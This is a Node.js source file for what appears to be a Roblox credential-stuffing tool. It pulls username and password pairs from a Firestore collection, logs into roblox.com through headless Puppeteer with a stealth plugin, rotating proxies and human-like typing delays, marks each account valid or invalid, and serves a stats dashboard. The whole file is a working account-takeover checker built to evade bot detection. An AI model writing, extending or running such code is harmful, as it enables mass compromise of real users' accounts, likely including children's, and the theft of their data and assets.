const fs = require('fs');
const admin = require('firebase-admin');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const express = require('express');
const cors = require('cors');
const path = require('path');

puppeteer.use(StealthPlugin());

// 🔥 Firebase Setup - Load from environment variable or file
let serviceAccount;
try {
  if (process.env.FIREBASE_CONFIG) {
    serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
  } else {
    serviceAccount = require('./oren-devs-firebase-adminsdk.json');
  }
} catch (error) {
  console.error('❌ Firebase config not found! Set FIREBASE_CONFIG env variable or add JSON file');
  process.exit(1);
}

admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
const db = admin.firestore();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const URL = 'https://roblox.com/login';

// ⚡ Global State
let stats = { processed: 0, valid: 0, invalid: 0, queue: 0, processing: 0 };
let processingQueue = [];
let activeBrowsers = 0;
const MAX_CONCURRENT = 2; // tune as needed

// 🛡️ Proxy List
const proxies = [
  'http://20.210.113.32:80',
  'http://154.16.63.190:80',
  'http://67.43.228.253:25803',
  'http://103.153.154.6:80',
  'http://47.74.152.29:8888'
];

function getRandomProxy() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

/**
 * Robustly find the Chromium executable path.
 * Priority:
 * 1. Environment variable PUPPETEER_EXECUTABLE_PATH
 * 2. System-installed Chrome/Chromium (common on Render/Ubuntu)
 * 3. Default Puppeteer-downloaded browser (via puppeteer.executablePath())
 */
function getExecutablePath() {
  if (process.env.PUPPETEER_EXECUTABLE_PATH) {
    return process.env.PUPPETEER_EXECUTABLE_PATH;
  }

  const commonPaths = [
    '/usr/bin/google-chrome-stable',
    '/usr/bin/chromium-browser',
    '/usr/bin/google-chrome',
    '/usr/bin/chromium',
    '/opt/render/project/src/node_modules/puppeteer/.local-chromium/linux-1022525/chrome-linux/chrome', // specific legacy path
  ];

  for (const p of commonPaths) {
    if (fs.existsSync(p)) return p;
  }

  // Fallback to puppeteer's default discovery (which might fail if not installed correctly)
  try {
    return require('puppeteer').executablePath();
  } catch (e) {
    return null;
  }
}

const CHROME_EXECUTABLE = getExecutablePath();
console.log('🚀 Puppeteer will use executable:', CHROME_EXECUTABLE || 'DEFAULT (Puppeteer Internal)');

async function validateCredential(credential) {
  let browser = null;
  try {
    stats.processing++;
    console.log(`🔍 [Queue:${stats.queue}] Validating: ${credential.username}`);

    const launchOpts = {
      headless: 'new',
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        `--proxy-server=${getRandomProxy()}`
      ]
    };

    if (CHROME_EXECUTABLE) {
      launchOpts.executablePath = CHROME_EXECUTABLE;
    }

    browser = await puppeteer.launch(launchOpts);

    activeBrowsers++;
    const page = await browser.newPage();

    await page.setDefaultTimeout(15000);
    await page.setDefaultNavigationTimeout(15000);

    // Block heavy resources to save bandwidth and speed up
    await page.setRequestInterception(true);
    page.on('request', (req) => {
      const rt = req.resourceType();
      if (['image', 'stylesheet', 'font', 'media'].includes(rt)) {
        req.abort();
      } else {
        req.continue();
      }
    });

    await page.goto(URL, { waitUntil: 'networkidle2' });
    
    // Check if we are actually on the login page
    await page.waitForSelector('#login-username', { timeout: 10000 });

    // Using page.type for more human-like behavior
    await page.type('#login-username', credential.username, { delay: 50 });
    await page.type('#login-password', credential.password, { delay: 50 });
    
    await Promise.all([
      page.click('button[type="submit"]'),
      page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {})
    ]);

    // Check for success/failure indicators
    const hasSettings = await page.$('span#nav-settings');
    const hasError = await page.$('.error, .alert, [class*="error"], [class*="invalid"]');

    if (hasSettings) {
      console.log(`✅ VALID: ${credential.username}`);
      await db.collection('credentials').doc(credential.id).update({
        status: 'valid',
        processed_at: admin.firestore.FieldValue.serverTimestamp()
      });
      stats.valid++;
      
      // Try to logout to be clean
      try {
        await page.click('span#nav-settings');
        await page.waitForSelector('a.rbx-menu-item.logout-menu-item', { timeout: 3000 });
        await page.click('a.rbx-menu-item.logout-menu-item');
      } catch (e) {}
      
      return 'valid';
    } else {
      console.log(`❌ INVALID: ${credential.username}`);
      await db.collection('credentials').doc(credential.id).update({
        status: 'invalid',
        processed_at: admin.firestore.FieldValue.serverTimestamp()
      });
      stats.invalid++;
      return 'invalid';
    }

  } catch (error) {
    console.error(`⚠️ ${credential.username} Error: ${error.message}`);
    try {
      await db.collection('credentials').doc(credential.id).update({
        status: 'invalid',
        error: error.message.substring(0, 200),
        processed_at: admin.firestore.FieldValue.serverTimestamp()
      });
    } catch (e) {}
    stats.invalid++;
    return 'invalid';
  } finally {
    if (browser) {
      await browser.close().catch(() => {});
      activeBrowsers--;
    }
    stats.processing--;
  }
}

async function processQueue() {
  if (activeBrowsers >= MAX_CONCURRENT || processingQueue.length === 0) return;

  const credential = processingQueue.shift();
  stats.queue = processingQueue.length;
  stats.processed++;

  await validateCredential(credential);
  console.log(`📊 Stats: ${stats.processed} total | ${stats.valid} ✅ | ${stats.invalid} ❌ | Queue: ${stats.queue} | Processing: ${stats.processing}`);
}

async function scanAndQueue() {
  try {
    const snapshot = await db.collection('credentials')
      .where('status', '==', 'pending')
      .limit(5)
      .get();

    if (!snapshot.empty) {
      console.log(`📥 Found ${snapshot.size} pending credentials`);
      snapshot.docs.forEach(doc => {
        const data = doc.data();
        data.id = doc.id;
        // Avoid duplicates in queue
        if (!processingQueue.find(q => q.id === data.id)) {
          processingQueue.push(data);
        }
      });
      stats.queue = processingQueue.length;
    }
  } catch (error) {
    console.error('❌ Firestore error:', error.message);
  }
}

async function queueProcessor() {
  while (true) {
    await processQueue();
    await new Promise(r => setTimeout(r, 1000));
  }
}

// Scan every 10 seconds
setInterval(scanAndQueue, 10000);

// API Endpoints
app.get('/api/stats', (req, res) => res.json(stats));
app.get('/api/pending', async (req, res) => {
  try {
    const snapshot = await db.collection('credentials')
      .where('status', '==', 'pending')
      .limit(10)
      .get();
    res.json(snapshot.docs.map(d => ({ id: d.id, ...d.data() })));
  } catch (error) {
    res.json([]);
  }
});

// Dashboard
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Validator running on port ${PORT}`);
  console.log('⏰ Scanning every 10 seconds | Queue system active');
  scanAndQueue();
  queueProcessor().catch(console.error);
});
